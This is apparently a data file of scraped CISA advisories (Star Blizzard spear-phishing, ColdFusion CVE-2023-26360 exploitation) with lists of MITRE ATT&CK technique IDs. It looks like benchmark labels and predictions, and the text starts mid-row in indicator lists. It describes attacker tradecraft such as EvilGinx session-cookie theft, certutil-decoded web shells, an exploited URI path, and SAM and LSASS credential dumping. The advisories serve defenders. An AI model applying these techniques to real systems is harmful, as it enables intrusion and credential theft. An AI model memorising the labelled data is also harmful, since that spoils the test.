18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93
19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641
1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8
219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67
92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6
B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7
C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD
C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0
C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3
F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69

Backdoored vcperf:

D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443

Backdoored Zabbix installation archive:

4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F

Backdoored Webroot AV installation archive:

950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4

Modified rsockstun

CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF

Network IoCs
Tunnel Endpoints

65.20.97,.,203
65.21.51,.,58

Exploitation Server

103.76.128,.,34

GraphicalProton HTTPS C2 URL:
hxxps://matclick,.,com/wp-query,.,php







This product is provided subject to this Notification and this Privacy & Use policy.


","['T1070', 'T1005', 'T1057', 'T1119', 'T1570', 'T1553', 'T1482', 'T1082', 'T1112', 'T1531', 'T1587', 'T1106', 'T1480', 'T1218', 'T1550', 'T1027', 'T1140', 'T1053', 'T1580', 'T1083', 'T1518', 'T1564', 'T1560', 'T1562', 'T1008']","{'T1588.002', 'T1589', 'T1055.012', 'T1037.003', 'T1053.005', 'T1003.003', 'T1564.008', 'T1057', 'T1046', 'T1584.004', 'T1055', 'T1027.009', 'T1033', 'T1027.013', 'T1136', 'T1595.002', 'T1591.004', 'T1111', 'T1588.001', 'T1218.011', 'T1213.003', 'T1074.001', 'T1556.009', 'T1566.001', 'T1102.002', 'T1082', 'T1112', 'T1586', 'T1587', 'T1106', 'T1003.002', 'T1059', 'T1195.001', 'T1562.001', 'T1589.002', 'T1059.001', 'T1087.002', 'T1574.002', 'T1027', 'T1562.002', 'T1550.003', 'T1591.002', 'T1560.003', 'T1070.004', 'T1078.004', 'T1071.001', 'T1195.002', 'T1649', 'T1049', 'T1047', 'T1190', 'T1591', 'T1098.005', 'T1078', 'T1008', 'T1518.001'}","{'T1574.001', 'T1597.002', 'T1583.001', 'T1589', 'T1588.002', 'T1037.003', 'T1053.005', 'T1003.003', 'T1564.008', 'T1057', 'T1046', 'T1033', 'T1055', 'T1136', 'T1027.013', 'T1221', 'T1595.002', 'T1591.004', 'T1111', 'T1112, T1003.001, T1053.005', 'T1589.003', 'T1190, T1110.003', 'T1036.005', 'T1218.011', 'T1213.003', 'T1074.001', 'T1556.009', 'T1566.001', 'T1102.002', 'T1082', 'T1112', 'T1082, T1018', 'T1588.005', 'T1106', 'T1003.002', 'T1059', 'T1072', 'T1195.001', 'T1562.001', 'T1057, T1033, T1049', 'T1589.002', 'T1059.001', 'T1087.002', 'T1574.002', 'T1027', 'T1562.002', 'T1550.003', 'T1591.002', 'T1584', 'T1580', 'T1560.003', 'T1480.001', 'T1070.004', 'T1059.003, T1070.004', 'T1597.001', 'T1071.001', 'T1195.002', 'T1649', 'T1049', 'T1556.006', 'T1027, T1548, T1059.001', 'T1047', 'T1190', 'T1591', 'T1078', 'T1008', 'T1591.001', 'T1518.001'}","{'T1070', 'T1589', 'T1046', 'T1021, T1047', 'T1016, T1082, T1057, T1049, T1033, T1007, T1018, T1021, T1055, T1560', 'T1055', 'T1136', 'T1003, T1552, T1560', 'T1589, T1078', 'T1203, T1105, T1071', 'T1574, T1036', 'T1589, T1590, T1591', 'T1574', 'T1190, T1078, T1071, T1566, T1583', 'T1110, T1190, T1078, T1210', 'T1583', 'T1193, T1192, T1195', 'T1102, T1071', 'T1027, T1140', 'T1003, T1053, T1112', 'T1102', 'T1552', 'T1003, T1021, T1071', 'T1105', 'T1071, T1105', 'T1059', 'T1219, T1112', 'T1562.001', 'T1558', 'T1003, T1070, T1027, T1567', 'T1203', 'T1027, T1027.002, T1560.002', 'T1027', 'T1589, T1595, T1598', 'T1046, T1027', 'T1566', 'T1562', 'T1078, T1071, T1570, T1059, T1547', 'T1053', 'T1070.004', 'T1190, T1203, T1505', 'T1071', 'T1046, T1218, T1059, T1055', 'T1600', 'T1112, T1219', 'T1018, T1087, T1046, T1071', 'T1556', 'T1071, T1082, T1105, T1110, T1190', 'T1195', 'T1574, T1546', 'T1190', 'T1564', 'T1071, T1087, T1193, T1203', 'T1027, T1070, T1547, T1555', 'T1078', 'T1003, T1059', 'T1082, T1016, T1057', 'T1003'}"
9,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-341a,"



The Russia-based actor is targeting organizations and individuals in the UK and other geographical areas of interest.
OVERVIEW
The Russia-based actor Star Blizzard (formerly known as SEABORGIUM, also known as Callisto Group/TA446/COLDRIVER/TAG-53/BlueCharlie) continues to successfully use spear-phishing attacks against targeted organizations and individuals in the UK, and other geographical areas of interest, for information-gathering activity.
The UK National Cyber Security Centre (NCSC), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Federal Bureau of Investigation (FBI), the US National Security Agency (NSA), the US Cyber National Mission Force (CNMF), the Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and the New Zealand National Cyber Security Centre (NCSC-NZ) assess that Star Blizzard is almost certainly subordinate to the Russian Federal Security Service (FSB) Centre 18.
Industry has previously published details of Star Blizzard. This advisory draws on that body of information.
This advisory raises awareness of the spear-phishing techniques Star Blizzard uses to target individuals and organizations. This activity is continuing through 2023.
To download a PDF version of this advisory, see Russian FSB Cyber Actor Star Blizzard Continues Worldwide Spear-phishing Campaigns.
TARGETING PROFILE
Since 2019, Star Blizzard has targeted sectors including academia, defense, governmental organizations, NGOs, think tanks and politicians.
Targets in the UK and US appear to have been most affected by Star Blizzard activity, however activity has also been observed against targets in other NATO countries, and countries neighboring Russia.
During 2022, Star Blizzard activity appeared to expand further, to include defense-industrial targets, as well as US Department of Energy facilities.
OUTLINE OF THE ATTACKS
The activity is typical of spear-phishing campaigns, where an actor targets a specific individual or group using information known to be of interest to the targets. In a spear-phishing campaign, an actor perceives their target to have direct access to information of interest, be an access vector to another target, or both.
Research and Preparation
Using open-source resources to conduct reconnaissance, including social media and professional networking platforms, Star Blizzard identifies hooks to engage their target. They take the time to research their interests and identify their real-world social or professional contacts [T1589], [T1593].
Star Blizzard creates email accounts impersonating known contacts of their targets to help appear legitimate. They also create fake social media or networking profiles that impersonate respected experts [T1585.001] and have used supposed conference or event invitations as lures.
Star Blizzard uses webmail addresses from different providers, including Outlook, Gmail, Yahoo and Proton mail in their initial approach [T1585.002], impersonating known contacts of the target or well-known names in the target’s field of interest or sector.
To appear authentic, the actor also creates malicious domains resembling legitimate organizations [T1583.001].
Microsoft Threat Intelligence Center (MSTIC) provides a list of observed Indicators of Compromise (IOCs) in their SEABORGIUM blog, but this is not exhaustive.
Preference for Personal Email Addresses
Star Blizzard has predominantly sent spear-phishing emails to targets’ personal email addresses, although they have also used targets’ corporate or business email addresses. The actors may intentionally use personal emails to circumvent security controls in place on corporate networks.
Building a Rapport
Having taken the time to research their targets’ interests and contacts to create a believable approach, Star Blizzard now starts to build trust. They often begin by establishing benign contact on a topic they hope will engage their targets. There is often some correspondence between attacker and target, sometimes over an extended period, as the attacker builds rapport.
Delivery of Malicious Link
Once trust is established, the attacker uses typical phishing tradecraft and shares a link [T1566.002], apparently to a document or website of interest. This leads the target to an actor-controlled server, prompting the target to enter account credentials.
The malicious link may be a URL in an email message, or the actor may embed a link in a document [T1566.001] on OneDrive, Google Drive, or other file-sharing platforms.
Star Blizzard uses the open-source framework EvilGinx in their spear- phishing activity, which allows them to harvest credentials and session cookies to successfully bypass the use of two-factor authentication [T1539], [T1550.004].
Exploitation and Further Activity
Whichever delivery method is used, once the target clicks on the malicious URL, they are directed to an actor-controlled server that mirrors the sign-in page for a legitimate service. Any credentials entered at this point are now compromised.
Star Blizzard then uses the stolen credentials to log in to a target’s email account [T1078], where they are known to access and steal emails and attachments from the victim’s inbox [T1114.002]. They have also set up mail- forwarding rules, giving them ongoing visibility of victim correspondence [T1114.003].
The actor has also used their access to a victim email account to access mailing-list data and a victim’s contacts list, which they then use for follow- on targeting. They have also used compromised email accounts for further phishing activity [T1586.002].
CONCLUSION
Spear-phishing is an established technique used by many actors, and Star Blizzard uses it successfully, evolving the technique to maintain their success.
Individuals and organizations from previously targeted sectors should be vigilant of the techniques described in this advisory.
In the UK you can report related suspicious activity to the NCSC.
Information on effective defense against spear-phishing is included in the Mitigations section below.
MITRE ATT&CK®
This report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.



Tactic
ID
Technique
Procedure




Reconnaissance
T1593
Search Open Websites/Domains
Star Blizzard uses open-source research and social media to identify information about victims to use in targeting.


Reconnaissance
T1589
Gather Victim Identity Information
Star Blizzard uses online data sets and open-source resources to gather information about their targets.


Resource Development
T1585.001
Establish Accounts: Social Media Accounts
Star Blizzard has been observed establishing fraudulent profiles on professional networking sites to conduct reconnaissance.


Resource Development
T1585.002
Establish Accounts: Email Accounts
Star Blizzard registers consumer email accounts matching the names of individuals they are impersonating to conduct spear-phishing activity.


Resource Development
T1583.001
Acquire Infrastructure: Domains
Star Blizzard registers domains to host their phishing framework.


Resource Development
T1586.002
Compromise Accounts: Email Accounts
Star Blizzard has been observed using compromised victim email accounts to conduct spear-phishing activity against contacts of the original victim.


Initial Access
T1078
Valid Accounts
Star Blizzard uses compromised credentials, captured from fake log- in pages, to log in to valid victim user accounts.


Initial Access
T1566.001
Phishing: Spear-phishing Attachment
Star Blizzard uses malicious links embedded in email attachments to direct victims to their credential-stealing sites.


Initial Access
T1566.002
Phishing: Spear-phishing Link
Star Blizzard sends spear-phishing emails with malicious links directly to credential-stealing sites, or to documents hosted on a file-sharing site, which then direct victims to credential-stealing sites.


Defense Evasion
T1550.004
Use Alternate Authentication Material: Web Session Cookie
Star Blizzard bypasses multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx.


Credential Access
T1539
Steal Web Session Cookie
Star Blizzard uses EvilGinx to steal the session cookies of victims directed to their fake log-in domains.


Collection
T1114.002
Email Collection: Remote Email Collection
Star Blizzard interacts directly with externally facing Exchange services, Office 365 and Google Workspace to access email and steal information using compromised credentials or access tokens.


Collection
T1114.003
Email Collection: Email Forwarding Rule
Star Blizzard abuses email- forwarding rules to monitor the activities of a victim, steal information, and maintain persistent access to victim's emails, even after compromised credentials are reset.



MITIGATIONS
A number of mitigations will be useful in defending against the activity described in this advisory.

Use strong passwords. Use a separate password for email accounts and avoid password re-use across multiple services. See NCSC guidance: Top Tips for Staying Secure Online.
Use multi-factor authentication (2-factor authentication/two-step authentication) to reduce the impact of password compromises. See NCSC guidance: Multi-factor Authentication for Online Services and Setting Up 2-Step Verification (2SV).
Protect your devices and networks by keeping them up to date: Use the latest supported versions, apply security updates promptly, use anti-virus and scan regularly to guard against known malware threats. See NCSC guidance: Device Security Guidance.
Exercise vigilance. Spear-phishing emails are tailored to avoid suspicion. You may recognize the sender’s name, but has the email come from an address that you recognize? Would you expect contact from this person’s webmail address rather than their corporate email address? Has the suspicious email come to your personal/webmail address rather than your corporate one? Can you verify that the email is legitimate via another means? See NCSC guidance: Phishing attacks: Defending Your Organization and Internet Crime Complaint Center(IC3) | Industry Alerts.
Enable your email providers’ automated email scanning features. These are turned on by default for consumer mail providers. See NCSC guidance: Telling Users to ""Avoid Clicking Bad Links"" Still Isn’t Working.
Disable mail-forwarding. Attackers have been observed to set up mail-forwarding rules to maintain visibility of target emails. If you cannot disable mail-forwarding, then monitor settings regularly to ensure that a forwarding rule has not been set up by an external malicious actor.

DISCLAIMER
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.
Refer any FOIA queries to ncscinfoleg@ncsc.gov.uk.
All material is UK Crown Copyright©.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1586.002', 'T1585.001', 'T1583.001', 'T1585.002', 'T1566.002', 'T1114.003', 'T1566.001', 'T1539', 'T1589', 'T1550.004', 'T1593', 'T1114.002', 'T1078'}","



The Russia-based actor is targeting organizations and individuals in the UK and other geographical areas of interest.
OVERVIEW
The Russia-based actor Star Blizzard (formerly known as SEABORGIUM, also known as Callisto Group/TA446/COLDRIVER/TAG-53/BlueCharlie) continues to successfully use spear-phishing attacks against targeted organizations and individuals in the UK, and other geographical areas of interest, for information-gathering activity.
The UK National Cyber Security Centre (NCSC), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Federal Bureau of Investigation (FBI), the US National Security Agency (NSA), the US Cyber National Mission Force (CNMF), the Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and the New Zealand National Cyber Security Centre (NCSC-NZ) assess that Star Blizzard is almost certainly subordinate to the Russian Federal Security Service (FSB) Centre 18.
Industry has previously published details of Star Blizzard. This advisory draws on that body of information.
This advisory raises awareness of the spear-phishing techniques Star Blizzard uses to target individuals and organizations. This activity is continuing through 2023.
To download a PDF version of this advisory, see Russian FSB Cyber Actor Star Blizzard Continues Worldwide Spear-phishing Campaigns.
TARGETING PROFILE
Since 2019, Star Blizzard has targeted sectors including academia, defense, governmental organizations, NGOs, think tanks and politicians.
Targets in the UK and US appear to have been most affected by Star Blizzard activity, however activity has also been observed against targets in other NATO countries, and countries neighboring Russia.
During 2022, Star Blizzard activity appeared to expand further, to include defense-industrial targets, as well as US Department of Energy facilities.
OUTLINE OF THE ATTACKS
The activity is typical of spear-phishing campaigns, where an actor targets a specific individual or group using information known to be of interest to the targets. In a spear-phishing campaign, an actor perceives their target to have direct access to information of interest, be an access vector to another target, or both.
Research and Preparation
Using open-source resources to conduct reconnaissance, including social media and professional networking platforms, Star Blizzard identifies hooks to engage their target. They take the time to research their interests and identify their real-world social or professional contacts,.
Star Blizzard creates email accounts impersonating known contacts of their targets to help appear legitimate. They also create fake social media or networking profiles that impersonate respected experts, and have used supposed conference or event invitations as lures.
Star Blizzard uses webmail addresses from different providers, including Outlook, Gmail, Yahoo and Proton mail in their initial approach, impersonating known contacts of the target or well-known names in the target’s field of interest or sector.
To appear authentic, the actor also creates malicious domains resembling legitimate organizations,.
Microsoft Threat Intelligence Center (MSTIC) provides a list of observed Indicators of Compromise (IOCs) in their SEABORGIUM blog, but this is not exhaustive.
Preference for Personal Email Addresses
Star Blizzard has predominantly sent spear-phishing emails to targets’ personal email addresses, although they have also used targets’ corporate or business email addresses. The actors may intentionally use personal emails to circumvent security controls in place on corporate networks.
Building a Rapport
Having taken the time to research their targets’ interests and contacts to create a believable approach, Star Blizzard now starts to build trust. They often begin by establishing benign contact on a topic they hope will engage their targets. There is often some correspondence between attacker and target, sometimes over an extended period, as the attacker builds rapport.
Delivery of Malicious Link
Once trust is established, the attacker uses typical phishing tradecraft and shares a link, apparently to a document or website of interest. This leads the target to an actor-controlled server, prompting the target to enter account credentials.
The malicious link may be a URL in an email message, or the actor may embed a link in a document, on OneDrive, Google Drive, or other file-sharing platforms.
Star Blizzard uses the open-source framework EvilGinx in their spear- phishing activity, which allows them to harvest credentials and session cookies to successfully bypass the use of two-factor authentication,.
Exploitation and Further Activity
Whichever delivery method is used, once the target clicks on the malicious URL, they are directed to an actor-controlled server that mirrors the sign-in page for a legitimate service. Any credentials entered at this point are now compromised.
Star Blizzard then uses the stolen credentials to log in to a target’s email account, where they are known to access and steal emails and attachments from the victim’s inbox,. They have also set up mail- forwarding rules, giving them ongoing visibility of victim correspondence,.
The actor has also used their access to a victim email account to access mailing-list data and a victim’s contacts list, which they then use for follow- on targeting. They have also used compromised email accounts for further phishing activity,.
CONCLUSION
Spear-phishing is an established technique used by many actors, and Star Blizzard uses it successfully, evolving the technique to maintain their success.
Individuals and organizations from previously targeted sectors should be vigilant of the techniques described in this advisory.
In the UK you can report related suspicious activity to the NCSC.
Information on effective defense against spear-phishing is included in the Mitigations section below.
MITRE ATT&CK®
This report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.

MITIGATIONS
A number of mitigations will be useful in defending against the activity described in this advisory.

Use strong passwords. Use a separate password for email accounts and avoid password re-use across multiple services. See NCSC guidance: Top Tips for Staying Secure Online.
Use multi-factor authentication (2-factor authentication/two-step authentication) to reduce the impact of password compromises. See NCSC guidance: Multi-factor Authentication for Online Services and Setting Up 2-Step Verification (2SV).
Protect your devices and networks by keeping them up to date: Use the latest supported versions, apply security updates promptly, use anti-virus and scan regularly to guard against known malware threats. See NCSC guidance: Device Security Guidance.
Exercise vigilance. Spear-phishing emails are tailored to avoid suspicion. You may recognize the sender’s name, but has the email come from an address that you recognize? Would you expect contact from this person’s webmail address rather than their corporate email address? Has the suspicious email come to your personal/webmail address rather than your corporate one? Can you verify that the email is legitimate via another means? See NCSC guidance: Phishing attacks: Defending Your Organization and Internet Crime Complaint Center(IC3) | Industry Alerts.
Enable your email providers’ automated email scanning features. These are turned on by default for consumer mail providers. See NCSC guidance: Telling Users to ""Avoid Clicking Bad Links"" Still Isn’t Working.
Disable mail-forwarding. Attackers have been observed to set up mail-forwarding rules to maintain visibility of target emails. If you cannot disable mail-forwarding, then monitor settings regularly to ensure that a forwarding rule has not been set up by an external malicious actor.

DISCLAIMER
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.
Refer any FOIA queries to ncscinfoleg@ncsc.gov.uk.
All material is UK Crown Copyright©.






This product is provided subject to this Notification and this Privacy & Use policy.


","['T1588', 'T1550', 'T1583', 'T1199', 'T1195', 'T1565', 'T1534', 'T1078', 'T1204', 'T1531', 'T1586', 'T1587', 'T1585', 'T1114']","{'T1583.001', 'T1539', 'T1589', 'T1564.008', 'T1591.004', 'T1111', 'T1593.001', 'T1598.001', 'T1566.001', 'T1556.005', 'T1585.002', 'T1585.001', 'T1589.002', 'T1598', 'T1562.002', 'T1566', 'T1591.002', 'T1552.001', 'T1114.003', 'T1566.002', 'T1078', 'T1586.002', 'T1566.003', 'T1598.003', 'T1614'}","{'T1583.001', 'T1539', 'T1589', 'T1564.008', 'T1566, T1598', 'T1595.002', 'T1111', 'T1566.001', 'T1556.005', 'T1566.003, T1194', 'T1585.002', 'T1562.001', 'T1585.001', 'T1597', 'T1589.002', 'T1598', 'T1593.001, T1585.001', 'T1562.002', 'T1110.004', 'T1566', 'T1591.002', 'T1552.001', 'T1114.003', 'T1597.001', 'T1566.002', 'T1078', 'T1586.002', 'T1566.003', 'T1598.003', 'T1566.', 'T1614'}","{'T1203, T1070, T1562', 'T1071', 'T1114, T1078', 'T1589', 'T1556', 'T1598', 'T1566, T1556', 'T1585, T1566', 'T1078', 'T1566', 'T1592', 'T1204', 'T1584', 'T1114'}"
10,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-339a,"






Actions to take today to mitigate malicious cyber activity:




Prioritize remediating known exploited vulnerabilities.
Employ proper network segmentation.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) is releasing a Cybersecurity Advisory (CSA) in response to confirmed exploitation of CVE-2023-26360 by unidentified threat actors at a Federal Civilian Executive Branch (FCEB) agency. This vulnerability presents as an improper access control issue impacting Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier). CVE-2023-26360 also affects ColdFusion 2016 and ColdFusion 11 installations; however, they are no longer supported since they reached end of life. Exploitation of this CVE can result in arbitrary code execution. Following the FCEB agency’s investigation, analysis of network logs confirmed the compromise of at least two public-facing servers within the environment between June and July 2023.
This CSA provides network defenders with tactics, techniques, and procedures (TTPs), indicators of compromise (IOCs), and methods to detect and protect against similar exploitation.
Download the PDF version of this report:


AA23-339A Threat Actors Exploit Adobe ColdFusion CVE-2023-26360 for Initial Access to Government Servers
(PDF,       449.49 KB
  )


For a downloadable copy of IOCs, see:


AA23-339A STIX XML
(XML,       23.83 KB
  )




AA23-339A STIX JSON
(JSON,       23.29 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for tables mapped to the threat actors’ activity.
Overview
Adobe ColdFusion is a commercial application server used for rapid web-application development. ColdFusion supports proprietary markup languages for building web applications and integrates external components like databases and other third-party libraries. ColdFusion uses a proprietary language, ColdFusion Markup Language (CFML), for development but the application itself is built using JAVA.
In June 2023, through the exploitation of CVE-2023-26360, threat actors were able to establish an initial foothold on two agency systems in two separate instances. In both incidents, Microsoft Defender for Endpoint (MDE) alerted of the potential exploitation of an Adobe ColdFusion vulnerability on public-facing web servers in the agency’s pre-production environment. Both servers were running outdated versions of software which are vulnerable to various CVEs. Additionally, various commands were initiated by the threat actors on the compromised web servers; the exploited vulnerability allowed the threat actors to drop malware using HTTP POST commands to the directory path associated with ColdFusion.
Analysis suggests that the malicious activity conducted by the threat actors was a reconnaissance effort to map the broader network. No evidence is available to confirm successful data exfiltration or lateral movement during either incident. Note: It is unknown if the same or different threat actors were behind each incident.
Incident 1
As early as June 26, 2023, threat actors obtained an initial foothold on a public-facing [T1190] web server running Adobe ColdFusion v2016.0.0.3 through exploitation of CVE-2023-26360. Threat actors successfully connected from malicious IP address 158.101.73[.]241. Disclaimer: CISA recommends organizations investigate or vet this IP address prior to taking action, such as blocking. This IP resolves to a public cloud service provider and possibly hosts a large volume of legitimate traffic.
The agency’s correlation of Internet Information Services (IIS) logs against open source[1] information indicates that the identified uniform resource identifier (URI) /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc was used to exploit CVE-2023-26360. The agency removed the asset from the network within 24 hours of the MDE alert.
Threat actors started process enumeration to obtain currently running processes on the web server and performed a network connectivity check, likely to confirm their connection was successful. Following additional enumeration efforts to obtain information about the web server and its operating system [T1082], the threat actors checked for the presence of ColdFusion version 2018 [T1518]—previous checks were also conducted against version 2016.
Threat actors were observed traversing the filesystem [T1083] and uploading various artifacts to the web server [T1105], to include deleting the file tat.cfm [T1070.004]. Note: This file was deleted prior to the victim locating it on the host for analysis. Its characteristics and functionality are unknown. In addition:

Certutil[2] was run against conf.txt [T1140] and decoded as a web shell (config.jsp) [T1505.003],[T1036.008]. Conf.txt was subsequently deleted, likely to evade detection.Note: Threat actors were only observed interacting with the config.jsp web shell from this point on.
HTTP POST requests [T1071.001] were made to config.cfm, an expected configuration file in a standard installation of ColdFusion [T1036.005]. Code review of config.cfm indicated malicious code—intended to execute on versions of ColdFusion 9 or less—was inserted with the intent to extract username, password, and data source uniform resource locators (URLs). According to analysis, this code insertion could be used in future malicious activity by the threat actors (e.g., by using the valid credentials that were compromised). This file also contained code used to upload additional files by the threat actors; however, the agency was unable to identify the source of their origin.
Threat actors attempted to run attrib.exe to hide the newly created config.jsp web shell [T1564.001]. Analysis of this phase found no indication of successful execution.
A small subset of events generated from various ColdFusion application logs identified that tat.cfm, config.jsp, and system.cfm failed to execute on the host due to syntax errors.

Threat actors created various files (see Table 1 below) in the C:\IBM directory using the initialization process coldfusion.exe. None of these files were located on the server (possibly due to threat actor deletion) but are assessed as likely threat actor tools. Analysts assessed the C:\IBM directory as a staging folder to support threat actors’ malicious operations.
Disclaimer: Organizations are encouraged to investigate the use of these files for related signs of compromise prior to performing remediation actions. Two artifacts are legitimate Microsoft files; threat actors were observed using these files following initial compromise for intended malicious purposes.

Table 1: Threat Actor Tools


File Name
Hash (SHA-1)
Description




eee.exe
b6818d2d5cbd902ce23461f24fc47e24937250e6
VirusTotal[3] flags this file as malicious. This was located in D:\$RECYCLE.BIN.


edge.exe
75a8ceded496269e9877c2d55f6ce13551d93ff4

The dynamic-link library (DLL) file msedge.dll attempted to execute via edge.exe but received an error.
Note: This file is part of the official Microsoft Edge browser and is a cookie exporter.



fscan.exe
be332b6e2e2ed9e1e57d8aafa0c00aa77d4b8656
Analysis confirmed at least three subnets were scanned using fscan.exe, which was launched from the C:\IBM directory [T1046].


RC.exe
9126b8320d18a52b1315d5ada08e1c380d18806b

RCDLL.dll attempted to execute via RC.exe but received an error.
Note: This file is part of the official Windows operating system and is called Microsoft Resource Compiler.




Note: The malicious code found on the system during this incident contained code that, when executed, would attempt to decrypt passwords for ColdFusion data sources. The seed value included in the code is a known value for ColdFusion version 8 or older—where the seed value was hard-coded. A threat actor who has control over the database server can use the values to decrypt the data source passwords in ColdFusion version 8 or older. The victim’s servers were running a newer version at the time of compromise; thus, the malicious code failed to decrypt passwords using the default hard-coded seed value for the older versions.
Incident 2
As early as June 2, 2023, threat actors obtained an initial foothold on an additional public-facing web server running Adobe ColdFusion v2021.0.0.2 via malicious IP address 125.227.50[.]97 through exploitation of CVE-2023-26360. Threat actors further enumerated domain trusts to identify lateral movement opportunities [T1482] by using nltest commands. The threat actors also collected information about local [T1087.001] and domain [T1087.002] administrative user accounts while performing reconnaissance by using commands such as localgroup, net user, net user /domain, and ID. Host and network reconnaissance efforts were further conducted to discover network configuration, time logs, and query user information.
Threat actors were observed dropping the file d.txt—decoded as d.jsp—via POST command in addition to eight malicious artifacts (hiddenfield.jsp, hiddenfield_jsp.class, hiddenfield_jsp.java, Connection.jsp, Connection_jsp.class, Connection_jsp.java, d_jsp.class, and d_jsp.java/). According to open source information, d.jsp is a remote access trojan (RAT) that utilizes a JavaScript loader [T1059.007] to infect the device and requires communication with the actor-controlled server to perform actions.[4] The agency’s analysis identified the trojan as a modified version of a publicly available web shell code.[5] After maintaining persistence, threat actors periodically tested network connectivity by pinging Google’s domain name system (DNS) [T1016.001]. The threat actors conducted additional reconnaissance efforts via searching for the .jsp files that were uploaded.
Threat actors attempted to exfiltrate the (Registry) files sam.zip, sec.zip, blank.jsp, and cf-bootstrap.jar. Windows event logs identified the actors were not successful due to the malicious activity being detected and quarantined. An additional file (sys.zip) was created on the system; however, there were no indications of any attempt to exfiltrate it. Analysis identified these files resulted from executed save and compress data processes from the HKEY_LOCAL_MACHINE (HKLM) Registry key, as well as save security account manager (SAM) [T1003.002] information to .zip files. The SAM Registry file may allow for malicious actors to obtain usernames and reverse engineer passwords; however, no artifacts were available to confirm that the threat actors were successful in exfiltrating the SAM Registry hive.
Windows event logs show that a malicious file (1.dat) was detected and quarantined. Analysis determined this file was a local security authority subsystem service (LSASS) dump [T1003.001] file that contained user accounts—to include multiple disabled credentials—and Windows new technology LAN manager (NTLM) passwords. The accounts were found on multiple servers across the victim’s network and were not successfully used for lateral movement.
As efforts for reconnaissance continued, the threat actors changed their approach to using security tools that were present on the victim server. Esentutl.exe[6] was used to attempt this registry dump. Attempts to download data from the threat actors’ command and control (C2) server were also observed but blocked and logged by the victim server. Threat actors further attempted to access SYSVOL, which is used to deliver policy and logon scripts to domain members on an agency domain controller [T1484.001]. The attempt was unsuccessful. Had the attempt succeeded, the threat actors may have been able to change policies across compromised servers.[7]
Note: During this incident, analysis strongly suggests that the threat actors likely viewed the data contained in the ColdFusion seed.properties file via the web shell interface. The seed.properties file contains the seed value and encryption method used to encrypt passwords. The seed values can also be used to decrypt passwords. No malicious code was found on the victim system to indicate the threat actors attempted to decode any passwords using the values found in seed.properties file. Versions of ColdFusion 9 or greater use the seed.properties file, which contains unique seed values that can only be used on a single server.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 2-9 for all referenced threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.

Table 2: Initial Access


Technique Title
ID
Use




Exploit Public-Facing Application
T1190
Threat actors exploited two public-facing web servers running outdated versions of Adobe ColdFusion.




Table 3: Execution


Technique Title
ID
Use




Command and Scripting Interpreter: JavaScript
T1059.007
In correlation with open source information, analysis determined d.jsp is a RAT that utilizes a JavaScript loader to infect the device and requires communication with the actor-controlled server to perform actions.




Table 4: Persistence


Technique Title
ID
Use




Server Software Component: Web Shell
T1505.003
Threat actors uploaded various web shells to enable remote code execution and to execute commands on compromised web servers.




Table 5: Privilege Escalation


Technique Title
ID
Use




Domain Policy Modification: Group Policy Modification
T1484.001
Threat actors attempted to edit SYSVOL on an agency domain controller to change policies.




Table 6: Defense Evasion


Technique Title
ID
Use




Masquerading: Match Legitimate Name or Location
T1036.005
Threat actors inserted malicious code with the intent to extract username, password, and data source URLs into config.cfm—an expected configuration file in a standard installation of ColdFusion.


Masquerading: Masquerade File Type
T1036.008
Threat actors used the .txt file extension to disguise malware files.


Indicator Removal: File Deletion
T1070.004
Threat actors deleted files following upload to remove malicious indicators.


Deobfuscate/Decode Files or Information
T1140
Threat actors used certutil to decode web shells hidden inside .txt files.


Hide Artifacts: Hidden Files and Directories
T1564.001
Threat actors attempted to run attrib.exe to hide the newly created config.jsp web shell.




Table 7: Credential Access


Technique Title
ID
Use




OS Credential Dumping: LSASS Memory
T1003.001
